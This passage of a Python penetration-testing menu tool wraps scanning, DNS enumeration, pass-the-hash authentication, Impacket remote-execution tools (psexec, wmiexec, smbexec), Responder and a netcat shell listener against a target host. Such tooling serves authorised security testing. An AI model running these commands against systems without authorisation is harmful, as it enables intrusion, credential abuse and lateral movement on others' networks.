   if selection == '10':
      BAK = DOM
      DOM = input("[?] Please enter domain name: ")      
      if DOM == "":
         DOM = BAK
      else:
         DOM = spacePadding(DOM, COL1)         
         if DOMC == 1:
            print("[+] Removing previous domain name " + BAK.rstrip(" ") + " from /etc/hosts...")
            runCommand("sed -i '$d' /etc/hosts")
            DOMC = 0            
         if DOMC == 0:
            if DOM[:5] != "EMPTY":
               runCommand("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
               print("[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
               DOMC = 1
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote DOMAIN SID value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '11':
      BAK = SID
      SID = input("[?] Please enter domain SID value: ")
      
      if SID != "":
         SID = spacePadding(SID, COL1)
      else:
         SID = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the File name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '12':
      BAK = FIL
      FIL = input("[?] Please enter file name: ")      
      if FIL != "":
         FIL = spacePadding(FIL,COL1)
      else:
         FIL = BAK    
 
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote SHARE name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '13':
      BAK = TSH
      TSH = input("[?] Please enter share name: ")      
      if TSH != "":
         TSH = spacePadding(TSH,COL1)
      else:
         TSH = BAK    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Start HTTP servers
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      dispSubMenu(" (01) HTTP Server (02) SMB Server (03) PHP Server (04) RUBY Server (05) SMTPD Server (06) NCAT Server (07) Responder (08) Quit")
      checkParams = 0
      subChoice = input("[?] Please select an option: ")
      if subChoice == "1":
         HTTP = input("[?] Please select a port value: ")
         if HTTP.isnumeric():
            choice = "python3 -m http.server --bind " + localIP + " " + HTTP
            checkParams = 1
      if subChoice == "2":
         choice = "impacket-smbserver " + workDir + " ./" + workDir + " -smb2support"
         checkParams = 1
      if subChoice == "3":
         HTTP = input("[?] Please select a port value: ")
         if HTTP.isnumeric():
            choice = "php -S " + localIP + ":" + HTTP    
            checkParams = 1
      if subChoice == "4":
         HTTP = input("[?] Please select a port value: ")
         if HTTP.isnumeric():
            choice = "ruby -run -e httpd . -p " + HTTP
            checkParams = 1
      if subChoice == "5":
         HTTP = input("[?] Please select a port value: ")
         if HTTP.isnumeric():
            choice = "python3  /usr/lib/python3.9/smtpd.py -n -c DebuggingServer " + localIP + ":" + HTTP
            checkParams = 1
      if subChoice == "6":
         HTTP = input("[?] Please select a port value: ")
         choice = "rlwrap nc -nvlp " + HTTP
         checkParams = 1
      if subChoice == "7":
         choice = "responder -I " + netWork + " -w On -r ONn -f On -v"
         checkParams = 1
      if subChoice == "8":
         pass
      if checkParams != 0:
        if HTTP != "":
            print(colored("[*] Specified local service started...", colour3))
            runCommand("xdotool key Ctrl+Shift+T")
            runCommand("xdotool key Alt+Shift+S; xdotool type 'LOCAL SERVICE'; xdotool key Return")
            dispBanner("LOCAL SERVICE",0) 
            runCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
            runCommand("xdotool type '" + choice + "'; xdotool key Return")
            runCommand("xdotool key Ctrl+Tab")         
      prompt()    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected -
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '15':
      dispSubMenu(" (01) Who (02) Dig (03) Enum (04) Reco (05) Quit")
      checkParams = 0
      subChoice = input("[?] Please select an option: ")
      
      if subChoice == "1":
         checkParams = test_DNS()         
         if checkParams != 1:
            print(colored("[*] Checking DNS Server...\n", colour3))         
            runCommand("whois -I "  + DNS.rstrip(" "))
      if subChoice == "2":
         checkParams = test_DNS()
         if checkParams != 1:
            checkParams = test_DOM()
         if checkParams != 1:
            print(colored("[*] Checking DNS Server...", colour3))
#           runCommand("dig axfr @" + TIP.rstrip(" ") + " " + DOM.rstrip(" "))
            runCommand("dig SOA " + DOM.rstrip(" ") + " @" + TIP.rstrip(" "))
      if subChoice == "3":
         checkParams = test_DOM()      
         if checkParams != 1:
            print(colored("[*] Checking DOMAIN Server...", colour3))
            runCommand("dnsenum " + DOM.rstrip(" "))        
      if subChoice == "4":
         checkParams = test_TIP()
         if checkParams != 1:
            checkParams = test_DOM()         
         if checkParams != 1:
            print(colored("[*] Checking DOMAIN zone transfer...", colour3))
            runCommand("dnsrecon -d " + DOM.rstrip(" ") + " -t axfr")         
            print(colored("[*] Bruteforcing DOMAIN name, please wait this can take sometime...", colour3))
            runCommand("dnsrecon -d " + DOM.rstrip(" ") + " -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt")
      if subChoice == "5":
         pass           
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap options
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '16':
      PTS = checkPorts(PTS, POR)
      POR = spacePadding(PTS, COL1)
      checkIke()      
      squidCheck()
      localTime = ServerSync(localTime)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '17':
      checkParam = test_TIP()      
      if checkParam != 1:
         if POR[:5] != "EMPTY":
            print(colored("[*] Scanning specified live ports only, please wait this may take sometime...", colour3))
            print("[+] Performing light scan...")            
            runCommand("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " -sV --version-light --reason --script=banner " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
            nmapTrim("light.tmp")            
            service = linecache.getline("service.tmp", 1)
            if "WINDOWS" in service.upper():
               OSF = spacePadding("WINDOWS", COL1)
            if "LINUX" in service.upper():
               OSF = spacePadding("LINUX", COL1)
            if "OS X" in service.upper():
               OSF = spacePadding("OS X", COL1)
            if "ANDROID" in service.upper():
               OSF = spacePadding("ANDROID", COL1)
            if "IOS" in service.upper():
               OSF = spacePadding("IOS", COL1)   
            parsFile("light.tmp")
            catsFile("light.tmp")            
            print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")         
            print("[+] Performing heavy scan...")
            runCommand("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " -sTUV -O -A -T4 --version-all --reason --script=discovery,external,auth " + TIP.rstrip(" ") + " -oN heavy.tmp 2>&1 > temp.tmp")
            runCommand("sed -i '/# Nmap/d' heavy.tmp")            
            catsFile("heavy.tmp")                   
            if "500" in PTS:
               runCommand("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
               catsFile("ike.tmp")
         else:
            print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3))
            print("[+] Performing light scan...")
            runCommand("nmap " + IP46 + " -p- --reason --script=banner " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
            nmapTrim("light.tmp")
            parsFile("light.tmp")
            catsFile("light.tmp")
            print("[+] Performing heavy scan...")
            runCommand("nmap " + IP46 + " -sT -sU -sV -Pn --reason --script=discovery,external,auth " + TIP.rstrip(" ") + " -oN heavy.tmp 2>&1 > temp.tmp")
            runCommand("sed -i '/# Nmap/d' heavy.tmp")                       
            catsFile("heavy.tmp")
            if "500," in PTS:
               runCommand("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
               catsFile("ike.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap IP46 -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '18':
      checkParams = test_DNS()
      if checkParams != 1:
         checkParams = test_DOM()         
      if checkParams != 1:
         print(colored("[*] Scanning for subdomains, please wait this can take sometime...", colour3))
         runCommand("echo '" + Green + "'")
         runCommand("gobuster dns -q --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 --resolver " + DNS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -i -o found.tmp")
         runCommand("echo '" + Reset + "'")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap IP46 -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      checkParams = test_WEB()
      if checkParams != 1:
         print(colored("[*] Scanning for vhosts, please wait this can take sometime...", colour3))
         runCommand("echo '" + Green + "'")
         runCommand("gobuster vhost -q -r -u " + WEB.rstrip(" ") + " -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -o found.tmp")
         runCommand("echo '" + Reset + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - WPSCAN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      print(colored("[*] Attempting to enumerate vulnerable plugins...", colour3))
      runCommand("wpscan --url " + WEB.rstrip(" ") + " --enumerate u,ap,vt,dbe,cb --plugins-detection mixed")
      prompt()
                  
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - getArch.py target IP
# Details : 32/64 bit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '21':
      checkParams = test_TIP()      
      if checkParams != 1:
         print(colored("[*] Attempting to enumerate architecture...", colour3))
         runCommand(keyPath + "getArch.py -target " + TIP.rstrip(" ") + " > os.tmp")                 
         with open("os.tmp") as read:
            for arch in read:
               if "is" in arch:
                  print("[+] Found architecture...\n")
                  print(colored(arch.rstrip("\n"),colour6))
                  checkParams = 1                  
      if checkParams == 0:
         print("[+] Unable to identify architecture...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='22':
      checkParama = test_TIP()
      if checkParams != 1:
         checkParams = test_DOM()      
      if checkParams != 1:
         runCommand(keyPath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -target " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - services.py USER:PASSWOrd@IP list.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='23':
      checkParams = test_TIP
      if checkParams != 1:
         checkParams = test_DOM()      
      if checkParams != 1:
         runCommand(keyPath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " list")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '24':
      checkParams = test_TIP()
      if checkParams != 1:
         checkParams = test_DOM()      
      if checkParams != 1:
         runCommand(keyPath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " whoami /all")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      checkParams = test_TIP()
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         runCommand(keyPath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP service command.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '26':
      checkParams = test_TIP()
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         runCommand(keyPath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      checkParams = test_TIP()
      if checkParams != 1:
         checkParams = test_DOM()            
      if checkParams != 1:
         runCommand(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      checkParams = test_TIP()
      if checkParams != 1:
         checkParams = test_DOM()      
      if checkParams != 1:
         runCommand(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - showmount -e IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='29':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_PRT("2049")
         if checkParams != 1:
            runCommand("showmount -e " + TIP.rstrip(" ") + " > mount.tmp")
            runCommand("sed -i '/Export list for/d' mount.tmp")                  
            if os.path.getsize("mount.tmp") > 0:
               print("[+] NFS exports found...\n")            
               with open("mount.tmp") as read:
                  for mount in read:
                     mount = mount.replace("/","")
                     mount = mount.rstrip("\n")
                     print(colored(mount,colour6))
            else:
               print("[-] No NFS exports were found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - mount -t nfs  IP:/mount mount/
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_PRT("2049")
         if checkParams != 1:
            mount = input("[?] Please enter NFS name : ")         
            if not os.path.exists(mount):
               runCommand("mkdir " + mount)
            runCommand("mount -o nolock -t nfs " + TIP.rstrip(" ") + ":/" + mount + " " + mount + "/")
            print("[+] NFS " + mount + " mounted...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -U-GUC --da --full.
# Modified: 08/12/2020 - Currently Using DOM rather than TIP as command has issues with IP6.
# -------------------------------------------------------------------------------------

   if selection =='31':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()                  
      if checkParams != 1:
            print(colored("[*] Enumerating DNS zones...", colour3))
            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")
            print(colored("\n[*] Enumerating domain admins...", colour3))
            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")                  
            print(colored("\n[*] Enumerating admin protected objects...", colour3))
            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                           
            print(colored("\n[*] Enumerating domain users...", colour3))
            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")         
            print(colored("\n[*] Enumerating remote management users...",colour3))
            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")                  
            print(colored("\n[*] Enumerating users with unconstrained delegation...", colour3))
            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
            print(colored("\n[*] Enumerating domain groups...", colour3))
            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")        
            print(colored("\n[*] Enumerating AD computers...", colour3))
            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         print(colored("[*] Enumerating, please wait....", colour3))
         runCommand(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > domain.tmp")                  
         runCommand("cat domain.tmp | grep 'Domain SID' > sid.tmp")         
         with open("sid.tmp", "r") as read:
            line1 =  read.readline()            
         if "Domain SID is:" in line1:
            SID = line1.replace('[*] Domain SID is: ',"")
            print("[+] Found DOMAIN SID...\n")
            print(colored(" " + SID, colour6))
            SID = spacePadding(SID, COL1)               
         else:
            print("[+] Unable to find domain SID...")                         
         runCommand("sed -i /*/d domain.tmp")
         runCommand("sed -i 's/.*://g' domain.tmp")   
         runCommand("cat domain.tmp | grep SidTypeAlias | sort > alias.tmp")      
         runCommand("cat domain.tmp | grep SidTypeGroup | sort > group.tmp")
         runCommand("cat domain.tmp | grep SidTypeUser  | sort > users.tmp")         
         runCommand("sed -i 's/(SidTypeAlias)//g' alias.tmp")
         runCommand("sed -i 's/(SidTypeGroup)//g' group.tmp")
         runCommand("sed -i 's/(SidTypeUser)//g'  users.tmp")                           
         if os.path.getsize("alias.tmp") != 0:
            print("[+] Found Aliases...\n")
            catsFile("alias.tmp")
         else:
            print("[+] Unable to find aliases...")                                    
         if os.path.getsize("group.tmp") != 0:
            print("\n[+] Found Groups...\n")
            catsFile("group.tmp")
         else:
            print("[+] Unable to find groups...")                                  
         if os.path.getsize("users.tmp") != 0:
            print("\n[+] Found Users...\n")
            catsFile("users.tmp")
         else:
            print("[+] Unable to find usernames...")                              
         if os.path.getsize("users.tmp") != 0:
            runCommand("rm " + dataDir + "/usernames.txt")
            runCommand("rm " + dataDir + "/hashes.txt")
            runCommand("touch " + dataDir + "/hashes.txt")
            wipeTokens(VALD)                     
            with open("users.tmp", "r") as read:
               for x in range(0, maxUser):
                  HASH[x] = " "*COL4
                  line1 = read.readline()                  
                  if line1 != "":
                     try:
                        null,USER[x] = line1.split("\\")
                     except ValueError:
                        USER[x] = "Error..."
                     USER[x] = spacePadding(USER[x], COL3)
                     runCommand("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                  else:
                     USER[x] = " "*COL3
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='33':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         print(colored("[*] Enumerating users, please wait this can take sometime...", colour3))         
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password authentication...\n")
            runCommand(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " > users.tmp")
         else:
            runCommand(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > users.tmp")         
         count = lineCount("users.tmp")         
         if count > 0:
            with open("users.tmp", "r") as read:
               for x in range(0, count):
                  line = read.readline()
                  if "[-] SMB SessionError:" in line:
                     checkParams = 1
                     runCommand("cat users.tmp")
                     break                                 
         if checkParams != 1:
            runCommand("rm " + dataDir + "/usernames.txt")          
            runCommand("rm " + dataDir + "/hashes.txt")                        
            runCommand("touch " + dataDir + "/hashes.txt")                      
            runCommand("sed -i -n '/Found user: /p' users.tmp")
            runCommand("cat users.tmp | sort > users2.tmp")            
            wipeTokens(VALD)            
            print("[+] Found usernames...\n")            
            with open("users2.tmp", "r") as read:
               for x in range (0, maxUser):
                  USER[x] = read.readline()                  
                  if USER[x] != "":
                     USER[x] = USER[x].replace("Found user: ", "")
                     USER[x] = USER[x].split(",")
                     USER[x] = USER[x][0]
                     USER[x] = spacePadding(USER[x], COL3)                                          
                     if USER[x] != "":
                       print(colored(USER[x],colour6))
                       runCommand("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                       HASH[x] = " "*COL4
                     else:
                        USER[x] = " "*COL3
                        HASH[x] = " "*COL4
                  else:
                     USER[x] = " "*COL3
                     HASH[x] = " "*COL4
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
# Modified: N/A
# Note    : Needs a structure rewrite!!!
# -------------------------------------------------------------------------------------

   if selection =='34':
      checkParams = test_TIP()     
      if checkParams != 1:
         checkParams = test_DOM()                  
      if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password authentication...")           
      print("[i] Valid registry hives are shown below...\n")
      registryKeys()                            
      if checkParams != 1:
         registryKey = ""         
         while registryKey.lower() != "quit":
            registryKey = input("\n[*] Enter registry key or type 'quit' to finish or 'help' for help: ") 
            if registryKey.lower() == "help":
               registryKeys()
            else:
               if NTM[:5] != "EMPTY" and registryKey.lower() != "quit": 
                  runCommand(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
               else:
                  if registryKey.lower() != "quit":
                     runCommand(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
      prompt()
            
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='35':
      checkParams = test_TIP()
      if checkParams != 1:
         checkParams = test_DOM()      
      if checkParams != 1:
         runCommand(keyPath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))

      stringBindings = input("[?] Enter a valid stringbinding value, such as 'ncacn_ip_tcp:" + DOM.rstrip(" ") + "[135]' : ")            
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[!] Using HASH value as defualt password...")
            if "135" in PTS:
               runCommand(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + stringBindings)
            if "443" in PTS:
               runCommand(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
         else:
            if "135" in PTS:
               runCommand(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " " + stringBindings)
            if "443" in PTS:
               runCommand(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '36':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()                     
      if checkParams != 1:
         if NTM[:5] == "EMPTY":
            runCommand("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
         else:
            print("[i] Using HASH value as password login credential...\n")
            runCommand("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ")) 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='37':
      checkParams = test_TIP()      
      if checkParams != 1:
         print(colored("[*] Finding shares, please wait...", colour3))
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            runCommand("smbmap -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%:" + NTM.rstrip(" ") + " > shares1.tmp")
            runCommand("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash > shares2.tmp")
            if not os.path.exists("shares2.tmp2"):
               if PAS.rstrip(" ") == "''":
                  print("[!] Requires password, please press ENTER...")
                  runCommand("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " -p " + NTM.rstrip(" ") + " --pw-nt-hash > shares2.tmp")               
         else:
            runCommand("smbmap -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares1.tmp")
            catsFile("shares1.tmp")                       
            runCommand("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares2.tmp")
            if not os.path.exists("shares2.tmp2"):
               if PAS.rstrip(" ") == "''":
                  print("[!] Requires password, please press ENTER...")
                  runCommand("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " > shares2.tmp")
